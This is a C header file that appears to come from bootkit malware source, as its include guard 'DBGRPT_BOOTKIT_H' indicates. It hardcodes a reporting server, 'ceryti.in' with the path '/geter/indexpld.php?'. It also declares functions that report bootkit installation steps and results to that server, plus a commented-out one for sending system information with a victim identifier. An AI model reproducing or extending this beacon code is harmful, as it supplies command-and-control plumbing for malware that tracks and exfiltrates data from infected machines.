#ifndef DBGRPT_BOOTKIT_H
#define DBGRPT_BOOTKIT_H

#include <windows.h>

#define PP_REPORT_HOST "ceryti.in"
#define PP_REPORT_PATH "/geter/indexpld.php?"
#define PP_REPORT_URL  "http://" PP_REPORT_HOST PP_REPORT_PATH

//#define PP_DBGRPT_FUNCTION_CALL(function) __noop

#ifdef DBGRPT_ENABLED
#	define PP_DBGRPT_FUNCTION_CALL(function) { (function); };
#else 
#	define PP_DBGRPT_FUNCTION_CALL(function) __noop
#endif

void DebugReportStep1();
void DebugReportStep2(DWORD BkInstallResult);
//void DebugReportStep3();
//void DebugReportStep5();
//void DebugReportStep6();
void DebugReportStepByName(const char* StepName);
//
//void DebugReportSendSysInfo(PCHAR uid, PCHAR path);

#endif //DBGRPT_BOOTKIT_H
